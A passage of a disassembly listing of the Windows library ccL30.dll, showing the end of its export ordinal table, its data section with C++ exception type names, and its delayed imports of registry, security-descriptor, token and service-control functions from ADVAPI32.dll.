		dd rva Ordinal975, rva Ordinal976, rva Ordinal977, rva Ordinal978
		dd rva Ordinal979, rva Ordinal980, rva Ordinal981, rva Ordinal982
		dd rva Ordinal983, rva Ordinal984, rva Ordinal985, rva Ordinal986
		dd rva Ordinal236, rva Ordinal988, rva Ordinal989, rva Ordinal990
		dd rva Ordinal991, rva Ordinal1118, rva	Ordinal993, rva	Ordinal994
		dd rva Ordinal995, rva Ordinal996, rva Ordinal997, rva Ordinal998
		dd rva Ordinal999, rva Ordinal1000, rva	Ordinal236, rva	Ordinal1002
		dd rva Ordinal1003, rva	Ordinal1004, rva Ordinal1005, rva Ordinal1006
		dd rva Ordinal1007, rva	Ordinal1008, rva Ordinal1009, rva Ordinal1010
		dd rva Ordinal1011, rva	Ordinal1010, rva Ordinal1011, rva Ordinal1014
		dd rva Ordinal1015, rva	Ordinal1016, rva Ordinal1017, rva Ordinal1018
		dd rva Ordinal1019, rva	Ordinal1020, rva Ordinal1021, rva Ordinal1022
		dd rva Ordinal1023, rva	Ordinal1024, rva Ordinal1025, rva Ordinal1026
		dd rva Ordinal236, rva Ordinal1028, rva	Ordinal1029, rva Ordinal1030
		dd rva Ordinal1031, rva	Ordinal1032, rva Ordinal1033, rva Ordinal1034
		dd rva Ordinal1035, rva	Ordinal1036, rva Ordinal1037, rva Ordinal1038
		dd rva Ordinal1039, 5 dup(rva Ordinal1044), 4 dup(rva Ordinal1046)
		dd rva Ordinal1049, rva	Ordinal1050, rva Ordinal1051, rva Ordinal1052
		dd rva Ordinal1053, rva	Ordinal1054, rva Ordinal1055, rva Ordinal1056
		dd rva Ordinal1057, rva	Ordinal1058, rva Ordinal1059, rva Ordinal1060
		dd rva Ordinal1061, rva	Ordinal1062, rva Ordinal849, rva Ordinal1064
		dd rva Ordinal1065, rva	Ordinal1066, rva Ordinal1067, rva Ordinal1068
		dd rva Ordinal1069, rva	Ordinal1064, rva Ordinal1071, rva Ordinal1072
		dd rva Ordinal1073, rva	Ordinal1074, rva Ordinal1075, rva Ordinal1076
		dd rva Ordinal1077, rva	Ordinal1078, rva Ordinal1079, rva Ordinal1080
		dd rva Ordinal1081, rva	Ordinal1082, rva Ordinal1083, rva Ordinal1084
		dd rva Ordinal1085, rva	Ordinal1086, rva Ordinal1087, rva Ordinal1088
		dd rva Ordinal1094, rva	Ordinal1090, rva Ordinal1091, 3	dup(rva	Ordinal1094)
		dd rva Ordinal1095, rva	Ordinal1096, rva Ordinal1091, rva Ordinal1098
		dd rva Ordinal1099, rva	Ordinal1100, rva Ordinal1101, rva Ordinal1102
		dd 2 dup(rva Ordinal1103), rva Ordinal1162, 2 dup(rva Ordinal1103)
		dd rva Ordinal1108, rva	Ordinal1109, rva Ordinal1110, rva Ordinal1111
		dd rva Ordinal1112, rva	Ordinal1113, rva Ordinal1114, rva Ordinal1115
		dd rva Ordinal1116, 2 dup(rva Ordinal1118), rva	Ordinal1119
		dd rva Ordinal1120, rva	Ordinal1121, rva Ordinal1122, rva Ordinal1123
		dd rva Ordinal1124, rva	Ordinal1125, rva Ordinal1126, rva Ordinal1127
		dd rva Ordinal1128, rva	Ordinal1129, rva Ordinal1130, rva Ordinal1131
		dd rva Ordinal1132, rva	Ordinal1133, rva Ordinal1134, rva Ordinal1135
		dd rva Ordinal865, rva Ordinal1137, rva	Ordinal1138, rva Ordinal1139
		dd rva Ordinal1140, rva	Ordinal1141, rva Ordinal1142, rva Ordinal1143
		dd rva Ordinal1144, rva	Ordinal1145, rva Ordinal1146, rva Ordinal1147
		dd rva Ordinal1148, rva	Ordinal1149, rva Ordinal1150, rva Ordinal1151
		dd rva Ordinal1152, rva	Ordinal1153, rva Ordinal1154, rva Ordinal1155
		dd rva Ordinal1156, rva	Ordinal236, rva	Ordinal1158, rva Ordinal1159
		dd rva Ordinal1160, 2 dup(rva Ordinal1162), rva	Ordinal1163
		dd rva Ordinal1164, rva	Ordinal1165, rva Ordinal1166, rva Ordinal1118
		dd rva Ordinal236, rva Ordinal865, rva Ordinal766, rva Ordinal1171
		dd rva Ordinal1172, rva	Ordinal1173, rva Ordinal1174, rva Ordinal658
		dd rva Ordinal1176, rva	Ordinal534, rva	Ordinal1178, rva Ordinal1179
		dd rva Ordinal1180, rva	Ordinal1181, rva Ordinal1182, rva Ordinal1183
		dd rva Ordinal1184, rva	Ordinal1185, rva Ordinal1186, rva Ordinal1187
		dd rva Ordinal1188, rva	Ordinal1189, rva Ordinal1190, rva Ordinal1191
		dd rva Ordinal1192, rva	Ordinal1193, rva Ordinal1194, rva Ordinal1195
		dd rva Ordinal1196, rva	Ordinal1197, rva Ordinal1198, rva Ordinal1199
		dd rva Ordinal1200, rva	Ordinal1201, rva Ordinal1202, rva Ordinal1203
		dd rva Ordinal1204, rva	Ordinal1205, rva Ordinal1206, rva Ordinal1207
		dd rva Ordinal1208, rva	Ordinal1209, rva Ordinal1210, rva Ordinal1211
		dd rva Ordinal1212, rva	Ordinal1213, rva Ordinal1214, rva Ordinal1215
		dd rva Ordinal1216, rva	Ordinal1217, rva Ordinal1218, rva Ordinal1219
		dd rva Ordinal1220, rva	Ordinal1221, rva Ordinal1222, rva Ordinal1223
		dd rva Ordinal1224, rva	Ordinal1225, rva Ordinal1226, rva Ordinal1224
		dd rva Ordinal1228, rva	Ordinal1229, rva Ordinal1230, rva Ordinal1231
		dd rva Ordinal1232, rva	Ordinal236, rva	Ordinal1234, rva Ordinal1235
		dd rva Ordinal1236, rva	Ordinal1237, rva Ordinal1238, rva Ordinal1239
		dd rva Ordinal1240, rva	Ordinal1241, rva Ordinal1242, rva Ordinal1243
		dd rva Ordinal1244, rva	Ordinal1245, rva Ordinal1246, rva Ordinal1247
		dd rva Ordinal1248, rva	Ordinal1249, rva Ordinal1250, rva Ordinal1251
		dd rva Ordinal1252, rva	Ordinal1253, rva Ordinal1254, rva Ordinal1255
		dd rva Ordinal1256, rva	Ordinal1257, rva Ordinal1231, rva Ordinal1232
		dd rva Ordinal236, rva Ordinal1261, rva	Ordinal1262, rva Ordinal1263
		dd rva Ordinal1264, rva	Ordinal1265, rva Ordinal236, rva Ordinal1267
		dd rva Ordinal1268, rva	Ordinal1269, rva Ordinal1270, rva Ordinal1271
		dd rva Ordinal1272, rva	Ordinal1273, rva Ordinal1274, rva Ordinal1275
		dd rva Ordinal1276, rva	Ordinal1277, rva Ordinal1278, rva Ordinal1279
		dd rva Ordinal1526, rva	Ordinal1281, rva Ordinal1282, rva Ordinal1283
		dd rva Ordinal1284, rva	Ordinal1285, rva Ordinal1173, rva Ordinal1287
		dd rva Ordinal1288, rva	Ordinal1091, rva Ordinal1290, rva Ordinal1291
		dd rva Ordinal1292, rva	Ordinal1118, rva Ordinal1294, rva Ordinal1295
		dd rva Ordinal1296, rva	Ordinal1297, rva Ordinal753, rva Ordinal1299
		dd rva Ordinal1300, rva	Ordinal1118, rva Ordinal1302, rva Ordinal1303
		dd rva Ordinal1304, rva	Ordinal1118, rva Ordinal1306, rva Ordinal1307
		dd rva Ordinal1296, rva	Ordinal753, rva	Ordinal1310, rva Ordinal1311
		dd rva Ordinal1118, rva	Ordinal1313, rva Ordinal1314, rva Ordinal1315
		dd rva Ordinal1118, rva	Ordinal1317, rva Ordinal1318, rva Ordinal1296
		dd rva Ordinal1320, rva	Ordinal1321, rva Ordinal1322, rva Ordinal1323
		dd rva Ordinal1324, rva	Ordinal753, rva	Ordinal1326, rva Ordinal1058
		dd rva Ordinal1118, rva	Ordinal1329, rva Ordinal1330, rva Ordinal1331
		dd rva Ordinal1332, rva	Ordinal1333, rva Ordinal1334, rva Ordinal1335
		dd rva Ordinal1336, rva	Ordinal1337, rva Ordinal1338, rva Ordinal1339
		dd rva Ordinal1064, rva	Ordinal1341, rva Ordinal1342, rva Ordinal1343
		dd rva Ordinal1064, rva	Ordinal1345, rva Ordinal1346, rva Ordinal1347
		dd rva Ordinal1348, rva	Ordinal1349, rva Ordinal1350, rva Ordinal1351
		dd rva Ordinal1352, rva	Ordinal1353, rva Ordinal1354, rva Ordinal1355
		dd rva Ordinal1356, rva	Ordinal1357, rva Ordinal1358, rva Ordinal1359
		dd rva Ordinal1360, rva	Ordinal1361, rva Ordinal1362, rva Ordinal1363
		dd rva Ordinal1364, rva	Ordinal1365, rva Ordinal1366, rva Ordinal1367
		dd rva Ordinal1368, rva	Ordinal1369, rva Ordinal1370, rva Ordinal1371
		dd rva Ordinal1372, rva	Ordinal1373, rva Ordinal1374, rva Ordinal1375
		dd rva Ordinal1376, rva	Ordinal1377, rva Ordinal1378, rva Ordinal1379
		dd rva Ordinal1380, rva	Ordinal1381, rva Ordinal1382, rva Ordinal1383
		dd rva Ordinal1384, rva	Ordinal1385, rva Ordinal1386, rva Ordinal1387
		dd rva Ordinal1388, rva	Ordinal1389, rva Ordinal1173, rva Ordinal1172
		dd rva Ordinal1392, rva	Ordinal1393, rva Ordinal1394, rva Ordinal1395
		dd rva Ordinal1396, rva	Ordinal1397, rva Ordinal1398, rva Ordinal1399
		dd rva Ordinal1400, rva	Ordinal1401, rva Ordinal1402, rva Ordinal1403
		dd rva Ordinal1404, rva	Ordinal1374, rva Ordinal1375, rva Ordinal1407
		dd rva Ordinal1408, rva	Ordinal1409, rva Ordinal1410, rva Ordinal1411
		dd rva Ordinal1412, rva	Ordinal1413, rva Ordinal1414, rva Ordinal1415
		dd rva Ordinal1416, rva	Ordinal1417, rva Ordinal1418, rva Ordinal1419
		dd rva Ordinal1420, rva	Ordinal1421, rva Ordinal1422, rva Ordinal1423
		dd rva Ordinal1424, rva	Ordinal1425, rva Ordinal1426, rva Ordinal1427
		dd rva Ordinal1428, rva	Ordinal1429, rva Ordinal1430, rva Ordinal1431
		dd rva Ordinal1432, rva	Ordinal1433, rva Ordinal1434, rva Ordinal1435
		dd rva Ordinal798, rva Ordinal799, rva Ordinal1438, rva	Ordinal801
		dd rva Ordinal802, rva Ordinal803, rva Ordinal1442, rva	Ordinal1443
		dd rva Ordinal1444, rva	Ordinal1445, rva Ordinal808, rva Ordinal1447
		dd rva Ordinal810, rva Ordinal1449, rva	Ordinal1450, rva Ordinal1451
		dd rva Ordinal1452, rva	Ordinal815, rva	Ordinal816, rva	Ordinal1455
		dd rva Ordinal1456, rva	Ordinal819, rva	Ordinal1458, rva Ordinal1459
		dd rva Ordinal1460, rva	Ordinal823, rva	Ordinal824, rva	Ordinal1463
		dd rva Ordinal1464, rva	Ordinal1465, rva Ordinal1466, rva Ordinal1467
		dd rva Ordinal1468, rva	Ordinal1469, rva Ordinal1470, rva Ordinal1471
		dd rva Ordinal1472, rva	Ordinal1172, rva Ordinal1474, rva Ordinal1475
		dd rva Ordinal1476, rva	Ordinal1477, rva Ordinal1478, rva Ordinal1479
		dd rva Ordinal1480, rva	Ordinal1481, rva Ordinal1482, rva Ordinal1483
		dd rva Ordinal1484, rva	Ordinal1485, rva Ordinal1486, rva Ordinal1487
		dd rva Ordinal1488, rva	Ordinal1489, rva Ordinal1490, rva Ordinal1491
		dd rva Ordinal1492, rva	Ordinal1493, rva Ordinal1494, rva Ordinal1495
		dd rva Ordinal1496, rva	Ordinal1497, rva Ordinal1498, rva Ordinal1499
		dd rva Ordinal1500, rva	Ordinal1501, rva Ordinal1172, rva Ordinal1474
		dd rva Ordinal1504, rva	Ordinal1505, rva Ordinal1506, rva Ordinal1507
		dd rva Ordinal1508, rva	Ordinal1509, rva Ordinal1510, rva Ordinal1511
		dd rva Ordinal1483, rva	Ordinal1513, rva Ordinal1514, rva Ordinal1515
		dd rva Ordinal1516, rva	Ordinal1517, rva Ordinal1518, rva Ordinal1519
		dd rva Ordinal1520, rva	Ordinal1521, rva Ordinal1522, rva Ordinal1523
		dd rva Ordinal1524, rva	Ordinal1525, rva Ordinal1526, rva Ordinal1182
		dd rva Ordinal1528, rva	Ordinal1529, rva Ordinal1530, rva Ordinal1531
		dd rva Ordinal1532, rva	Ordinal1533, rva Ordinal1534, rva Ordinal1535
		dd rva Ordinal1536, rva	Ordinal1537, rva Ordinal1538, rva Ordinal1539
		dd rva Ordinal1540, rva	Ordinal1541, rva Ordinal1542
aCcl30_dll	db 'ccL30.dll',0        ; DATA XREF: .rdata:6AF6607Co
					; .rdata:6AF66090o ...
		align 1000h
_rdata		ends

; Section 3. (virtual address 00038000)
; Virtual size			: 000002FC (	764.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00036400
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 6AF68000h
dword_6AF68000	dd 0			; DATA XREF: _CRT_INIT(x,x,x)+65o
		dd offset ___security_init_cookie
		dd offset sub_6AF536F4
		dd offset sub_6AF5370A
		dd offset sub_6AF53732
		dd offset sub_6AF536DE
dword_6AF68018	dd 6 dup(0)		; DATA XREF: _CRT_INIT(x,x,x)+5Eo
; volatile LONG	Target
Target		dd offset sub_6AF310AD	; DATA XREF: sub_6AF310AD+45o
					; sub_6AF310AD+50r ...
stru_6AF68034	dq offset off_6AF61A50	; getInfoPtr ; DATA XREF: .rdata:6AF61DACo
					; .rdata:6AF61F8Co ...
		db '.?AVCAtlException@ATL@@',0; Name
off_6AF68054	dd offset off_6AF61A50	; DATA XREF: .rdata:6AF61E38o
		dd 0
a_?avexception@	db '.?AVexception@@',0
off_6AF6806C	dd offset off_6AF61A50	; DATA XREF: .rdata:6AF61E54o
		dd 0
a_?avlogic_erro	db '.?AVlogic_error@std@@',0
		align 4
off_6AF6808C	dd offset off_6AF61A50	; DATA XREF: .rdata:6AF61E70o
		dd 0
a_?avlength_err	db '.?AVlength_error@std@@',0
		align 4
off_6AF680AC	dd offset off_6AF61A50	; DATA XREF: .rdata:6AF61EF4o
		dd 0
a_?avout_of_ran	db '.?AVout_of_range@std@@',0
		align 4
off_6AF680CC	dd offset off_6AF61A50	; DATA XREF: .rdata:6AF61F7Co
					; .rdata:6AF61FE4o ...
		dd 0
a_?avbad_alloc@	db '.?AVbad_alloc@std@@',0
off_6AF680E8	dd offset off_6AF61A50	; DATA XREF: .rdata:6AF628E8o
		align 10h
a_?avcarchiveex	db '.?AVCArchiveException@CArchive@ccLib@@',0
		align 4
off_6AF68118	dd offset off_6AF61A50	; DATA XREF: .rdata:off_6AF61BA8o
					; .rdata:6AF61BE4o ...
		align 10h
a_?av_com_error	db '.?AV_com_error@@',0
		align 10h
___security_cookie dd 0BB40E64Eh	; DATA XREF: sub_6AF31048+6r
					; sub_6AF310AD+9r ...
off_6AF68144	dd offset off_6AF61A50	; DATA XREF: .rdata:off_6AF61B64o
					; .rdata:6AF61BA0o
		dd 0
a_?avtype_info@	db '.?AVtype_info@@',0
		align 10h
off_6AF68160	dd offset sub_6AF52C70	; DATA XREF: sub_6AF52C60+7r
_data		ends

;
; Delayed imports from ADVAPI32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; PVOID	__stdcall FreeSid(PSID pSid)
		extrn FreeSid:dword	; CODE XREF: Ordinal306+1B8p
					; Ordinal306+1C5p ...
; BOOL __stdcall SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR	pSecurityDescriptor, BOOL bDaclPresent,	PACL pDacl, BOOL bDaclDefaulted)
		extrn SetSecurityDescriptorDacl:dword ;	CODE XREF: Ordinal306+174p
					; Ordinal918+65p
					; DATA XREF: ...
; BOOL __stdcall AddAccessAllowedAce(PACL pAcl,	DWORD dwAceRevision, DWORD AccessMask, PSID pSid)
		extrn AddAccessAllowedAce:dword	; CODE XREF: Ordinal306+142p
					; Ordinal306+155p
					; DATA XREF: ...
; BOOL __stdcall InitializeAcl(PACL pAcl, DWORD	nAclLength, DWORD dwAclRevision)
		extrn InitializeAcl:dword ; CODE XREF: Ordinal306+119p
					; DATA XREF: Ordinal306+119r ...
; BOOL __stdcall InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor,	DWORD dwRevision)
		extrn InitializeSecurityDescriptor:dword ; CODE	XREF: Ordinal306+E3p
					; Ordinal918+54p
					; DATA XREF: ...
; DWORD	__stdcall GetLengthSid(PSID pSid)
		extrn GetLengthSid:dword ; CODE	XREF: Ordinal306+94p
					; Ordinal306+D3p
					; DATA XREF: ...
; BOOL __stdcall AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID	*pSid)
		extrn AllocateAndInitializeSid:dword ; CODE XREF: Ordinal306+87p
					; Ordinal306+B5p ...
; BOOL __stdcall DeregisterEventSource(HANDLE hEventLog)
		extrn DeregisterEventSource:dword ; CODE XREF: Ordinal710+25p
					; DATA XREF: Ordinal710+25r ...
; BOOL __stdcall ReportEventA(HANDLE hEventLog,	WORD wType, WORD wCategory, DWORD dwEventID, PSID lpUserSid, WORD wNumStrings, DWORD dwDataSize, LPCSTR	*lpStrings, LPVOID lpRawData)
		extrn ReportEventA:dword ; CODE	XREF: Ordinal744+144p
					; DATA XREF: Ordinal744+144r ...
; BOOL __stdcall LookupAccountNameA(LPCSTR lpSystemName, LPCSTR	lpAccountName, PSID Sid, LPDWORD cbSid,	LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse)
		extrn LookupAccountNameA:dword ; CODE XREF: Ordinal744+D0p
					; Ordinal744+108p
					; DATA XREF: ...
; BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
		extrn GetUserNameA:dword ; CODE	XREF: Ordinal744+86p
					; DATA XREF: Ordinal744+86r ...
; HANDLE __stdcall RegisterEventSourceA(LPCSTR lpUNCServerName,	LPCSTR lpSourceName)
		extrn RegisterEventSourceA:dword ; CODE	XREF: Ordinal709+38p
					; DATA XREF: Ordinal709+38r ...
; BOOL __stdcall EqualSid(PSID pSid1, PSID pSid2)
		extrn EqualSid:dword	; CODE XREF: Ordinal954+1A1p
					; Ordinal955+168p
					; DATA XREF: ...
; BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,	LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength)
		extrn GetTokenInformation:dword	; CODE XREF: Ordinal954+116p
					; Ordinal954+16Ep ...
; BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle,	DWORD DesiredAccess, PHANDLE TokenHandle)
		extrn OpenProcessToken:dword ; CODE XREF: Ordinal954+E4p
					; Ordinal955+B5p
					; DATA XREF: ...
; BOOL __stdcall OpenThreadToken(HANDLE	ThreadHandle, DWORD DesiredAccess, BOOL	OpenAsSelf, PHANDLE TokenHandle)
		extrn OpenThreadToken:dword ; CODE XREF: Ordinal954+BEp
					; Ordinal955+8Fp
					; DATA XREF: ...
; BOOL __stdcall CheckTokenMembership(HANDLE TokenHandle, PSID SidToCheck, PBOOL IsMember)
		extrn __imp_CheckTokenMembership:dword ; DATA XREF: .text:6AF5209Ao
					; CheckTokenMembershipr
; LSTATUS __stdcall RegCloseKey(HKEY hKey)
		extrn RegCloseKey:dword	; CODE XREF: Ordinal994+Bp
					; DATA XREF: Ordinal994+Br ...
; LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName)
		extrn RegDeleteValueA:dword ; CODE XREF: Ordinal1000+Ap
					; DATA XREF: Ordinal1000+Ar ...
; LSTATUS __stdcall RegQueryValueExA(HKEY hKey,	LPCSTR lpValueName, LPDWORD lpReserved,	LPDWORD	lpType,	LPBYTE lpData, LPDWORD lpcbData)
		extrn RegQueryValueExA:dword ; CODE XREF: Ordinal1002+1Dp
					; Ordinal1008+26p ...
; LSTATUS __stdcall RegSetValueExA(HKEY	hKey, LPCSTR lpValueName, DWORD	Reserved, DWORD	dwType,	const BYTE *lpData, DWORD cbData)
		extrn RegSetValueExA:dword ; CODE XREF:	Ordinal1005+20p
					; Ordinal1009+15p ...
; LSTATUS __stdcall RegEnumValueA(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
		extrn RegEnumValueA:dword ; CODE XREF: Ordinal1016+1Ep
					; DATA XREF: Ordinal1016+1Er ...
; LSTATUS __stdcall RegEnumKeyExA(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass,	LPDWORD	lpcchClass, PFILETIME lpftLastWriteTime)
		extrn RegEnumKeyExA:dword ; CODE XREF: Ordinal1017+1Ep
					; DATA XREF: Ordinal1017+1Er ...
; LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey,	DWORD Reserved,	LPSTR lpClass, DWORD dwOptions,	REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition)
		extrn RegCreateKeyExA:dword ; CODE XREF: Ordinal993+49p
					; DATA XREF: Ordinal993+49r ...
; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY	phkResult)
		extrn RegOpenKeyExA:dword ; CODE XREF: Ordinal993+1Dp
					; DATA XREF: Ordinal993+1Dr ...
; BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject)
		extrn CloseServiceHandle:dword ; CODE XREF: Ordinal1031+130p
					; Ordinal1031+139p ...
; BOOL __stdcall ChangeServiceConfig2A(SC_HANDLE hService, DWORD dwInfoLevel, LPVOID lpInfo)
		extrn ChangeServiceConfig2A:dword ; CODE XREF: Ordinal1031+F7p
					; DATA XREF: Ordinal1031+F7r ...
; SC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR	lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR	lpDependencies,	LPCSTR lpServiceStartName, LPCSTR lpPassword)
		extrn CreateServiceA:dword ; CODE XREF:	Ordinal1031+C4p
					; DATA XREF: Ordinal1031+C4r ...
; SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD	dwDesiredAccess)
		extrn OpenSCManagerA:dword ; CODE XREF:	Ordinal1031+39p
					; Ordinal1032+2Fp
					; DATA XREF: ...
; BOOL __stdcall DeleteService(SC_HANDLE hService)
		extrn DeleteService:dword ; CODE XREF: Ordinal1032+8Dp
					; DATA XREF: Ordinal1032+8Dr ...
; SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR	lpServiceName, DWORD dwDesiredAccess)
		extrn OpenServiceA:dword ; CODE	XREF: Ordinal1032+5Ep
					; DATA XREF: Ordinal1032+5Er ...
; BOOL __stdcall SetServiceStatus(SERVICE_STATUS_HANDLE	hServiceStatus,	LPSERVICE_STATUS lpServiceStatus)
		extrn SetServiceStatus:dword ; CODE XREF: Ordinal1049+32p
					; DATA XREF: Ordinal1049+32r ...
; SERVICE_STATUS_HANDLE	__stdcall RegisterServiceCtrlHandlerA(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc)
		extrn RegisterServiceCtrlHandlerA:dword	; CODE XREF: .text:6AF48D50p
					; DATA XREF: .text:6AF48D50r ...
; SERVICE_STATUS_HANDLE	__stdcall RegisterServiceCtrlHandlerExA(LPCSTR lpServiceName, LPHANDLER_FUNCTION_EX lpHandlerProc, LPVOID lpContext)
		extrn RegisterServiceCtrlHandlerExA:dword ; CODE XREF: .text:6AF48D42p
					; DATA XREF: .text:6AF48D42r ...
; BOOL __stdcall StartServiceCtrlDispatcherA(const SERVICE_TABLE_ENTRYA	*lpServiceStartTable)
		extrn StartServiceCtrlDispatcherA:dword	; CODE XREF: Ordinal1030+136p
					; DATA XREF: Ordinal1030+136r ...

; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 6AF681F0h
		dd 2 dup(0)
dword_6AF681F8	dd 2 dup(0)		; DATA XREF: sub_6AF31006+9o
					; sub_6AF3101A+9o ...
		dd 14h dup(?)
byte_6AF68250	db ?			; DATA XREF: sub_6AF524A4+94w
		align 4
dword_6AF68254	dd ?			; DATA XREF: HandlerRoutine:loc_6AF3E2D5r
					; HandlerRoutine:loc_6AF3E2E2r	...
dword_6AF68258	dd ?			; DATA XREF: Ordinal745+10w
					; TopLevelExceptionFilterr ...
dword_6AF6825C	dd ?			; DATA XREF: Ordinal906+16w
					; sub_6AF462A6r ...
dword_6AF68260	dd ?			; DATA XREF: Ordinal982+10w Handlerr ...
dword_6AF68264	dd ?			; DATA XREF: Ordinal1022+10w
					; sub_6AF48804r ...
dword_6AF68268	dd ?			; DATA XREF: sub_6AF48B13+5r
					; sub_6AF48C19:loc_6AF48C32r ...
dword_6AF6826C	dd ?			; DATA XREF: sub_6AF4C9A4+1Ar
					; sub_6AF4C9A4+3Ew
dword_6AF68270	dd ?			; DATA XREF: sub_6AF4C9A4+9r
					; sub_6AF4C9A4+43w
ADVAPI32_dll_handle dd ?		; DATA XREF: .rdata:6AF645E0o
dword_6AF68278	dd ?			; DATA XREF: sub_6AF5215E+16Er
					; sub_6AF5215E+176w
dword_6AF6827C	dd ?			; DATA XREF: sub_6AF5215E+111r
					; sub_6AF5215E+1E8r
dword_6AF68280	dd ?			; DATA XREF: sub_6AF5215E:loc_6AF5221Cr
					; sub_6AF5215E+E2r ...
dword_6AF68284	dd 0Fh dup(?)		; DATA XREF: sub_6AF3151B+3o
					; sub_6AF536F4o ...
dword_6AF682C0	dd ?			; DATA XREF: sub_6AF5370A+Bw
					; sub_6AF53732o ...
dword_6AF682C4	dd ?			; DATA XREF: sub_6AF5370A+15w
byte_6AF682C8	db ?			; DATA XREF: sub_6AF5370A+1Aw
		align 4
dword_6AF682CC	dd ?			; DATA XREF: sub_6AF318C3r
					; sub_6AF318C3+8o ...
		dd 6 dup(?)
dword_6AF682E8	dd ?			; DATA XREF: _CRT_INIT(x,x,x)+8r
					; _CRT_INIT(x,x,x)+10w	...
dword_6AF682EC	dd ?			; DATA XREF: _CRT_INIT(x,x,x)+21w
dword_6AF682F0	dd ?			; DATA XREF: DllEntryPoint:loc_6AF52A9Dr
					; DllEntryPoint+A6r
dword_6AF682F4	dd ?			; DATA XREF: __onexit:loc_6AF526C2o
					; _CRT_INIT(x,x,x)+4Aw	...
; void *Memory
Memory		dd ?			; DATA XREF: __onexitr	__onexit+14o ...
		align 1000h
_data		ends


		end DllEntryPoint
